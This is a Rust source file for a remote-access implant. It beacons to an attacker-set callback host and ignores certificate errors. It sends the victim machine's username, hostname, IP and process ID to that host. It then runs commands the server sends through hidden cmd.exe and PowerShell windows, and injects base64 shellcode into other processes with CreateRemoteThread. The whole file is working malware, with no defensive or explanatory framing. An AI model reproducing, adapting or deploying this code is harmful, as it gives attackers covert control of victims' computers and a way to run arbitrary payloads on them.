use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::env;
use std::net::UdpSocket;
use std::process::Command;

const CALLBACK: &str = env!("CALLBACK");
const UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

// ── Wire types ───────────────────────────────────────────────────────────────

#[derive(Serialize)]
struct RegisterRequest {
    link_username: String,
    link_hostname: String,
    internal_ip: String,
    external_ip: String,
    platform: String,
    pid: u32,
}

#[derive(Serialize)]
struct CallbackRequest<'a> {
    q: &'a str,
    tasking: &'a str,
}

#[derive(Deserialize)]
struct TaskResponse {
    q: String,
    tasking: String,
    x_request_id: String,
}

// ── HTTP client ──────────────────────────────────────────────────────────────

fn build_client() -> Client {
    Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .user_agent(UA)
        .build()
        .expect("reqwest client init failed")
}

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USERNAME")
        .or_else(|_| env::var("USER"))
        .unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    env::var("COMPUTERNAME")
        .or_else(|_| env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    let client = build_client();
    let base = format!("https://{}", CALLBACK);

    // Stage 1: establish session cookie
    loop {
        if client.get(format!("{}/js", base)).send().is_ok() {
            break;
        }
        sleep(5);
    }

    // Stage 2: register
    let reg = RegisterRequest {
        link_username: username(),
        link_hostname: hostname(),
        internal_ip: local_ip(),
        external_ip: String::new(),
        platform: "windows".into(),
        pid: std::process::id(),
    };

    let mut x_req_id = loop {
        if let Ok(r) = client
            .post(format!("{}/static/register", base))
            .json(&reg)
            .send()
        {
            if let Ok(t) = r.json::<TaskResponse>() {
                break t.x_request_id;
            }
        }
        sleep(5);
    };

    // Stage 3: polling loop
    let mut prev_output = String::new();
    let mut prev_task_id = String::new();

    loop {
        let cb = CallbackRequest {
            q: &prev_output,
            tasking: &prev_task_id,
        };

        match client
            .post(format!("{}/static/get", base))
            .header("x-request-id", &x_req_id)
            .json(&cb)
            .send()
            .and_then(|r| r.json::<TaskResponse>())
        {
            Ok(task) => {
                x_req_id = task.x_request_id.clone();
                if task.q.is_empty() {
                    prev_output = String::new();
                    prev_task_id = String::new();
                } else if task.q == "exit" {
                    break;
                } else {
                    prev_output = dispatch(&task.q);
                    prev_task_id = task.tasking.clone();
                }
            }
            Err(_) => {
                prev_output = String::new();
                prev_task_id = String::new();
            }
        }

        sleep(5);
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    let (cmd, args) = split_first(raw);
    match cmd {
        "cd" => env::set_current_dir(args)
            .map(|_| String::new())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "pwd" => env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "ls" => list_dir(if args.is_empty() { "." } else { args }),

        "pid" => std::process::id().to_string(),

        "whoami" => format!("{}\\{}", hostname(), username()),

        "integrity" => integrity_level(),

        "inject" => inject_cmd(args),

        // cmd /C … wrapper sent by the server
        _ if raw.starts_with("cmd /C ") || raw.starts_with("cmd.exe /C ") => {
            let inner = raw
                .trim_start_matches("cmd /C ")
                .trim_start_matches("cmd.exe /C ");
            shell_exec("cmd.exe", &["/C", inner])
        }

        // powershell wrapper
        _ if raw.starts_with("powershell") => {
            shell_exec("powershell.exe", &["-noP", "-sta", "-w", "1", "-c", args])
        }

        // fallback: send through cmd.exe
        _ => shell_exec("cmd.exe", &["/C", raw]),
    }
}

/// Run a subprocess, suppressing the console window on Windows.
fn shell_exec(prog: &str, args: &[&str]) -> String {
    let mut cmd = Command::new(prog);
    cmd.args(args);

    // CREATE_NO_WINDOW (0x08000000) – Windows-only extension trait
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000);
    }

    match cmd.output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("<DIR>  {}", name)
                } else {
                    format!("       {}", name)
                }
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

// ── Token integrity level (Windows only) ────────────────────────────────────

#[cfg(target_os = "windows")]
fn integrity_level() -> String {
    use std::ptr;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::winnt::{TokenIntegrityLevel, SID, TOKEN_MANDATORY_LABEL, TOKEN_QUERY};

    const LOW: u32 = 0x1000;
    const MEDIUM: u32 = 0x2000;
    const HIGH: u32 = 0x3000;
    const SYSTEM: u32 = 0x4000;

    unsafe {
        let mut token = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return "unknown".into();
        }

        // First call: get required buffer size
        let mut size: u32 = 0;
        GetTokenInformation(token, TokenIntegrityLevel, ptr::null_mut(), 0, &mut size);
        let mut buf = vec![0u8; size as usize];

        if GetTokenInformation(
            token,
            TokenIntegrityLevel,
            buf.as_mut_ptr().cast(),
            size,
            &mut size,
        ) == 0
        {
            CloseHandle(token);
            return "unknown".into();
        }
        CloseHandle(token);

        // Interpret the buffer as TOKEN_MANDATORY_LABEL
        let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
        let sid = label.Label.Sid as *const SID;
        let count = (*sid).SubAuthorityCount as isize;
        // SubAuthority is declared as [DWORD; 1] but is a variable-length tail
        let rid = *(*sid).SubAuthority.as_ptr().offset(count - 1);

        match rid {
            r if r < LOW => "Untrusted",
            r if r < MEDIUM => "Low",
            r if r < HIGH => "Medium",
            r if r < SYSTEM => "High",
            _ => "System",
        }
        .to_string()
    }
}

#[cfg(not(target_os = "windows"))]
fn integrity_level() -> String {
    "N/A".into()
}

// ── Process injection (Windows only) ────────────────────────────────────────

fn inject_cmd(args: &str) -> String {
    let (pid_str, b64) = split_first(args);
    if b64.is_empty() {
        return "Usage: inject <pid> <base64_shellcode>".into();
    }
    let pid: u32 = match pid_str.parse() {
        Ok(p) => p,
        Err(_) => return "Usage: inject <pid> <base64_shellcode>".into(),
    };
    use base64::{engine::general_purpose, Engine};
    match general_purpose::STANDARD.decode(b64) {
        Ok(sc) => inject_shellcode(pid, &sc),
        Err(e) => format!("[-] base64 decode: {}", e),
    }
}

#[cfg(target_os = "windows")]
fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
    use std::ptr;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS,
    };

    unsafe {
        let proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if proc.is_null() {
            return format!("[-] OpenProcess({}) failed", pid);
        }

        let addr = VirtualAllocEx(
            proc,
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            CloseHandle(proc);
            return "[-] VirtualAllocEx failed".into();
        }

        let mut written = 0usize;
        WriteProcessMemory(
            proc,
            addr,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut written,
        );

        let mut old = 0u32;
        VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

        let thr = CreateRemoteThread(
            proc,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(addr)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        if thr.is_null() {
            CloseHandle(proc);
            return "[-] CreateRemoteThread failed".into();
        }

        CloseHandle(thr);
        CloseHandle(proc);
        format!("[+] Injected {} bytes into PID {}", shellcode.len(), pid)
    }
}

#[cfg(not(target_os = "windows"))]
fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
    format!(
        "[-] Process injection only available on Windows (pid={}, sc_len={})",
        pid,
        shellcode.len()
    )
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}
